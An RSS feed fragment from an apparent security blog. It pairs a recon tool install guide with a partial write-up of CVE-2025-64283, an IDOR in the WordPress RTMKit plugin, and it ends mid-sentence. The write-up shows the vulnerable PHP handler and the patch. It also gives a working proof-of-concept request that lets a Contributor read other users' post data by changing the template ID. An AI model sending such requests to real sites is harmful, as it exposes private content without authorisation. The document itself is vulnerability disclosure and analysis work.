cls=&amp;#39;clear&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;source ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;golang&#34;&gt;&lt;span&gt;Golang&lt;/span&gt;&#xA;  &lt;a href=&#34;#golang&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;Tải&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo apt install golang-go -y&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Cấu hình&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;nano ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;export PATH=&amp;#34;$HOME/go/bin:$PATH&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;source ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;some-tool-from-project-discovery&#34;&gt;&lt;span&gt;Some Tool from Project Discovery&lt;/span&gt;&#xA;  &lt;a href=&#34;#some-tool-from-project-discovery&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;&lt;code&gt;nuclei&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;nuclei -update-templates&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&lt;code&gt;httpx&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;&lt;code&gt;subfinder&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;&lt;code&gt;dnsx&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;5&#34;&gt;&#xA;&lt;li&gt;&lt;code&gt;katana&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;go install -v github.com/projectdiscovery/katana/cmd/katana@latest&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;6&#34;&gt;&#xA;&lt;li&gt;&lt;code&gt;assetfinder&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;go install github.com/tomnomnom/assetfinder@latest&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;7&#34;&gt;&#xA;&lt;li&gt;&lt;code&gt;chaos-client&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;go install -v github.com/projectdiscovery/chaos-client/cmd/chaos@latest&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;8&#34;&gt;&#xA;&lt;li&gt;&lt;code&gt;uncover&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;go install -v github.com/projectdiscovery/uncover/cmd/uncover@latest&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;docker&#34;&gt;&lt;span&gt;Docker&lt;/span&gt;&#xA;  &lt;a href=&#34;#docker&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;sudo apt install -y docker.io&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;sudo systemctl start docker  &lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;sudo usermod -aG docker $USER&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;sudo apt install docker-compose -y&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>CVE-2025-64283 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-24-cve-2025-64283/</link>
      <pubDate>Wed, 24 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-24-cve-2025-64283/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-24-cve-2025-64283/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;An &lt;strong&gt;Authorization Bypass&lt;/strong&gt; vulnerability through a &lt;strong&gt;User-Controlled Key&lt;/strong&gt; in &lt;strong&gt;Rometheme RTMKit (rometheme-for-elementor)&lt;/strong&gt; allows exploitation of &lt;strong&gt;incorrectly configured access control&lt;/strong&gt; mechanisms.&lt;br&gt;&#xA;This vulnerability affects &lt;strong&gt;RTMKit&lt;/strong&gt; from &lt;strong&gt;n/a&lt;/strong&gt; through &lt;strong&gt;version ≤ 1.6.7&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-64283&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-64283&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.6.7&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.6.8&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.4)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/rometheme-for-elementor/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress ARTMKit Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version – ARTMKit&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.6.7&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.6.8&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers the following action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action(&amp;#39;wp_ajax_get_template_content&amp;#39;, [$this, &amp;#39;get_template_content&amp;#39;]);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In WordPress, the &lt;code&gt;wp_ajax_&lt;/code&gt; prefix is used to handle AJAX requests sent to &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; from &lt;strong&gt;authenticated users&lt;/strong&gt;. When a request includes the parameter &lt;code&gt;action=get_template_content&lt;/code&gt;, WordPress invokes the corresponding &lt;code&gt;get_template_content&lt;/code&gt; function to process and return data.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function get_template_content()&#xA;{&#xA;    if (!isset($_POST[&amp;#39;wpnonce&amp;#39;]) ||  ! check_ajax_referer(&amp;#39;rtm_template_nonce&amp;#39;, &amp;#39;wpnonce&amp;#39;)) {&#xA;        wp_send_json_error(&amp;#39;Access Denied&amp;#39;);&#xA;        wp_die();&#xA;    }&#xA;&#xA;    $id = absint($_POST[&amp;#39;template&amp;#39;]);&#xA;&#xA;    $elementorData = get_post_meta($id, &amp;#39;_elementor_data&amp;#39;, true);&#xA;&#xA;    $data = [&amp;#39;content&amp;#39; =&amp;gt; json_decode($elementorData)];&#xA;&#xA;    wp_send_json_success($data);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;get_template_content&lt;/code&gt; function processes the AJAX request as follows:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Checks the existence of &lt;code&gt;wpnonce&lt;/code&gt; and validates it using &lt;code&gt;check_ajax_referer&lt;/code&gt; to ensure request legitimacy and CSRF protection.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;div class=&#34;alert alert-tip&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M8 1.5c-2.363.0-4 1.69-4 3.75.0.984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75.0 01-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456.0 00-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863.0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751.0 01-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304.0-2.06-1.637-3.75-4-3.75zM5.75 12h4.5a.75.75.0 010 1.5h-4.5a.75.75.0 010-1.5zM6 15.25a.75.75.0 01.75-.75h2.5a.75.75.0 010 1.5h-2.5A.75.75.0 016 15.25z&#34;/&gt;&lt;/svg&gt;Tip&lt;/p&gt;&lt;p&gt;When searching for the keyword &lt;code&gt;rtm_template_nonce&lt;/code&gt;&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-24-cve-2025-64283/create_nonce.png&#34; title=&#34;How the nonce is created&#34; data-thumbnail=&#34;/posts/2025-12-24-cve-2025-64283/create_nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Create nonce&lt;/h2&gt;&lt;p&gt;How the nonce is created&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-24-cve-2025-64283/create_nonce.png&#39; alt=&#34;Create nonce&#34; height=&#34;239&#34; width=&#34;1197&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;How the nonce is created&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&#xA;The nonce is generated using &lt;code&gt;wp_create_nonce(&#39;rtm_template_nonce&#39;)&lt;/code&gt; and attached to the JavaScript object &lt;code&gt;rkit_libs&lt;/code&gt; via &lt;code&gt;wp_localize_script&lt;/code&gt; with the storage key &lt;code&gt;template_nonce&lt;/code&gt;. The client uses this value and sends it back in the AJAX request as the &lt;code&gt;wpnonce&lt;/code&gt; parameter for validation.&#xA;When filtering requests in BurpSuite using the keyword &lt;code&gt;rkit_libs&lt;/code&gt;, this value can be observed.&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-24-cve-2025-64283/nonce.png&#34; title=&#34;Nonce value&#34; data-thumbnail=&#34;/posts/2025-12-24-cve-2025-64283/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce value&lt;/h2&gt;&lt;p&gt;Nonce value&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-24-cve-2025-64283/nonce.png&#39; alt=&#34;Nonce value&#34; height=&#34;328&#34; width=&#34;1537&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce value&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&lt;/div&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Retrieves the &lt;code&gt;template&lt;/code&gt; parameter from &lt;code&gt;POST&lt;/code&gt; and casts it to an integer using &lt;code&gt;absint&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Fetches the &lt;code&gt;_elementor_data&lt;/code&gt; meta value associated with the post ID via &lt;code&gt;get_post_meta&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Decodes the JSON data and wraps it in a response array.&lt;/li&gt;&#xA;&lt;li&gt;Returns the data via a successful JSON response (&lt;code&gt;wp_send_json_success&lt;/code&gt;).&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Bug&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;The vulnerability arises because &lt;code&gt;$id&lt;/code&gt; is not properly access-controlled, allowing &lt;strong&gt;Contributor+&lt;/strong&gt; users to retrieve arbitrary post data belonging to other users.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Patch v1.6.8&lt;/strong&gt; introduces an additional user capability check using &lt;code&gt;current_user_can(&#39;manage_options&#39;)&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (!current_user_can(&amp;#39;manage_options&amp;#39;)) {&#xA;    wp_send_json_error(&amp;#39;Access Denied: Insufficient permissions&amp;#39;);&#xA;    wp_die();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This ensures that only users with &lt;strong&gt;Administrator&lt;/strong&gt; privileges can proceed. Unauthorized users receive an &lt;code&gt;Access Denied: Insufficient permissions&lt;/code&gt; response.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Authenticated Contributor&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Send POST request to admin-ajax.php&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;action=get_template_content&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;get_template_content() executed&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;check_ajax_referer passed&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;Control template ID parameter&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;get_post_meta(target_id, _elementor_data)&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;Return template content&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Create a post using &lt;strong&gt;Elementor&lt;/strong&gt; with a &lt;strong&gt;Contributor+ user&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Capture the request using BurpSuite and extract the returned nonce value:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;script id=&amp;#34;rkit-library-script-js-extra&amp;#34;&amp;gt;&#xA;    var rkit_libs = {&amp;#34;logo_url&amp;#34;:&amp;#34;http://localhost/wp-content/plugins/rometheme-for-elementor//view/images/RTMKitNew.png&amp;#34;,&amp;#34;ajax_url&amp;#34;:&amp;#34;http://localhost/wp-admin/admin-ajax.php&amp;#34;,&amp;#34;template_nonce&amp;#34;:&amp;#34;nonce_value&amp;#34;};&#xA;    //# sourceURL=rkit-library-script-js-extra&#xA;&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Send a request with &lt;code&gt;template=id_of_other_post&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: contributor_cookie&#xA;&#xA;action=get_template_content&amp;amp;wpnonce=bea52715a7&amp;amp;template=25&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-24-cve-2025-64283/admin_post.png&#34; title=&#34;Administrator post content&#34; data-thumbnail=&#34;/posts/2025-12-24-cve-2025-64283/admin_post.png&#34; data-sub-html=&#34;&lt;h2&gt;Administrator post&lt;/h2&gt;&lt;p&gt;Administrator post content&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-24-cve-2025-64283/admin_post.png&#39; alt=&#34;Administrator post&#34; height=&#34;799&#34; width=&#34;1412&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Administrator post content&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Other AJAX actions affected by the same 